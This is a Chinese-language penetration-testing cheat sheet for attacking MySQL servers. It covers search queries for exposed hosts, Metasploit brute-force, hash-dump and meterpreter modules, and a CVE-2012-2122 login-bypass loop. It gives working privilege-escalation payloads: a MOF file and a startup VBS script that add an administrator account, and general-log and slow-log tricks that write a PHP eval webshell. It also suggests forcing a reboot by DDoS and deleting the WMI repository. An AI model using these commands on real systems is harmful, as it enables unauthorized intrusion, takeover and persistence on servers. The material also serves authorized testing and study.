# Mysql

> shodan : "product:MySQL"
> fofa : app="Oracle-MySQL"

**描述**

MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，MySQL 的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，它分为社区版和商业版，一般中小型网站的开发选择 MySQL 作为网站数据库。

**Mysql 基础**
- [Mysql](../../../../Integrated/数据库/笔记/Mysql.md)

**Mysql 注入**
- [Mysql数据库注入笔记](../../Web安全/Web_Generic/SQLi.md#Mysql)

**MSF 爆破**
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS [IP]
set USER_FILE [用户名字典]
set PASS_FILE [密码字典]
set STOP_ON_SUCCESS true
set THREADS 20
exploit
```

**MSF 上传文件执行**
```bash
use exploit/windows/mysql/scrutinizer_upload_exec
set RHOST [ip]
set USERNAME [user]
set PASSWORD [pass]
set payload windows/meterpreter/bind_tcp
set RHOST [ip]
set LPORT 4444
exploit
```

**MSF 获取 mysql.user 的 hash**
```bash
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS [ip]
set USERNAME [user]
set PASSWORD [pass]
set THREADS 20
exploit
```

**CVE-2012-2122 Mysql 身份认证绕过漏洞**
- 漏洞描述

    当连接 MariaDB/MySQL 时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是 memcmp() 返回一个非零值，也会使 MySQL 认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入 SQL 数据库。

- POC | Payload | exp
    ```
    for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done
    ```

**CVE-2012-5615 Oracle MySQL Server 5.5.19 用户名枚举漏洞**
- 漏洞描述

    MySQL 5.5.19 以及其他版本和 MariaDB 5.5.28a，5.3.11，5.2.13，5.1.66 以及其他版本中存在漏洞，该漏洞源于不同时间延迟产生不同错误消息取决于用户名是否存在。远程攻击者利用该漏洞枚举有效的用户名。

- POC | Payload | exp
    - [MySQL - Remote User Enumeration](https://www.exploit-db.com/exploits/23081)
    - [MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution](https://www.exploit-db.com/exploits/23073)

**CVE-2016-6662**
- 漏洞描述

    Oracle MySQL 中的配置文件（my.cnf）存在远程代码执行漏洞。攻击者（本地或远程）可通过授权访问 MySQL 数据库（网络连接或类似 phpMyAdmin 的 Web 接口）或 SQL 注入方式，利用该漏洞向配置文件中注入恶意的数据库配置，导致以 root 权限执行任意代码，完全控制受影响的服务器。以下版本受到影响：Oracle MySQL 5.5.52 及之前的版本，5.6.x 至 5.6.33 版本，5.7.x 至 5.7.15 版本；MariaDB 5.5.51 之前的版本，10.0.27 之前的 10.0.x 版本，10.1.17 之前的 10.1.x 版本；Percona Server 5.5.51-38.1 之前的版本，5.6.32-78.0 之前的 5.6.x 版本，5.7.14-7 之前的 5.7.x 版本。

- 相关文章
    - [【技术分享】CVE-2016-6662：Mysql远程代码执行/权限提升技术分析正式版](https://www.anquanke.com/post/id/84557)

---

## MySQL 文件读

**相关文章**
- [通过MySQL LOAD DATA特性来达到任意文件读取](https://xz.aliyun.com/t/3973)
- [Mysql Read Client's File](https://y4er.com/post/mysql-read-client-file/)

**相关工具**
- [Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)
- [BeichenDream/MysqlT](https://github.com/BeichenDream/MysqlT) - 伪造 Myslq 服务端, 并利用 Mysql 逻辑漏洞来获取客户端的任意文件反击攻击者

---

## Mysql提权

**相关文章**
- [Windows下三种mysql提权剖析](https://xz.aliyun.com/t/2719)

### UDF 提权

**相关文章**
- [Command execution with a MySQL UDF](http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)

**POC | Payload | exp**
- [mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)
- [T3st0r-Git/HackMySQL](https://github.com/T3st0r-Git/HackMySQL) - Using To MySQL Elevate Privileges.
- MSF 模块
    ```bash
    use exploit/multi/mysql/mysql_udf_payload
    set RHOSTS [ip]
    set USERNAME [user]
    set PASSWORD [pass]
    set target 0
    set payload windows/meterpreter/bind_tcp
    set RHOST [ip]
    set LPORT 4444
    exploit
    ```

### MOF 提权

MOF提权的条件要求十分严苛:
1. windows 03 及以下版本
2. mysql 启动身份具有权限去读写 c:/windows/system32/wbem/mof 目录
3. secure-file-priv 参数不为 null

```ini
#pragma namespace("\\.\root\subscription")

instance of __EventFilter as
{
EventNamespace = "Root\Cimv2";
Name  = "filtP2";
Query = "Select * From __InstanceModificationEvent "
    "Where TargetInstance Isa \"Win32_LocalTime\" "
    "And TargetInstance.Second = 5";
QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as
{
Name = "consPCSV2";
ScriptingEngine = "JScript";
ScriptText =
"var WSH = new ActiveXObject(\"WScript.Shell\") WSH.run(\"net.exe user sqladmin admin /add&&net.exe localgroup administrators sqladmin /add\")";
};

instance of __FilterToConsumerBinding
{
Consumer   = ;
Filter = ;
};
```
1. 保存为 1.mof,然后 mysql 执行:`select load_file('D:/wwwroot/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';`
2. mof 被执行的话,会帮我们添加一个叫 sqladmin 的用户.

**关于 Mof 提权的弊端**

我们提权成功后,就算被删号,mof 也会在五秒内将原账号重建,那么这给我们退出测试造成了很大的困扰,所以谨慎使用.那么我们如何删掉我们的入侵账号呢？
```
net stop winmgmt
del c:/windows/system32/wbem/repository
net start winmgmt
```

- MSF 模块
    ```bash
    use exploit/windows/mysql/mysql_mof
    set RHOSTS [ip]
    set USERNAME [user]
    set PASSWORD [pass]
    set payload windows/meterpreter/bind_tcp
    set RHOST [ip]
    set LPORT 4444
    exploit
    ```

### 启动项提权

在前两种方法都失败时,那可以试一下启动项提权..因为要求达到的条件和 mof 几乎一样,并且要重启服务,所以不是十分推荐.原理还是使用 mysql 写文件,写入一段 VBS 代码到开机自启动中,服务器重启达到创建用户并提权,可以使用 DDOS 迫使服务器重启.

提权条件
1. file_priv 不为 null
2. 已知 root 密码

```sql
create table a (cmd text);
insert into a values ("set wshshell=createobject (""wscript.shell"") " );
insert into a values ("a=wshshell.run (""cmd.exe /c net user sqladmin 123456 /add"",0) " );
insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators sqladmin /add"",0) " );
select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";
```

### 日志 getshell

查询当前 mysql 下 log 日志的默认地址，同时也看下 log 日志是否为开启状态，并且记录下原地址，方便后面恢复。
```sql
-- 开启日志监测，一般是关闭的，如果一直开，文件会很大的。
set global general_log = on;

-- 这里设置我们需要写入的路径就可以了。
set global general_log_file = 'D:/shell.php';

-- 查询一个一句话，这个时候log日志里就会记录这个。
select '<?php eval($_POST['1']);?>';
```

```sql
-- 结束后，再修改为原来的路径。
set global general_log_file = 'D:\xampp\mysql\data\1.log';

-- 关闭下日志记录。
set global general_log = off;
```

### 慢查询日志

MySQL 的慢查询日志是 MySQL 提供的一种日志记录，它用来记录在 MySQL 中响应时间超过阀值的语句。

对日志量庞大，直接访问日志网页极有可能出现 500 错误。通过开启慢查询日志，记录了超时 10s 的 SQL，这样页面的代码量会减轻很多不易导致 500, 配置可解析日志文件 GETSHELL。
```sql
show variables like '%slow%';
```
long_query_time 的默认值为 10，意思是运行 10S 以上的语句。该值可以指定为微秒的分辨率。具体指运行时间超过 long_query_time 值的 SQL，则会被记录到慢查询日志中。

```sql
set GLOBAL slow_query_log_file='C:/phpStudy/PHPTutorial/WWW/slow.php';
set GLOBAL slow_query_log=on;
set GLOBAL log_queries_not_using_indexes=on;
```

```sql
select '<?php phpinfo();?>' from mysql.db where sleep(10);
```

### CVE-2021-27928

**相关文章**
- [CVE-2021-27928漏洞复现](https://blog.csdn.net/Cypher_X/article/details/117073244)

**POC | Payload | exp**
- [MariaDB 10.2 - 'wsrep_provider' OS Command Execution](https://www.exploit-db.com/exploits/49765)
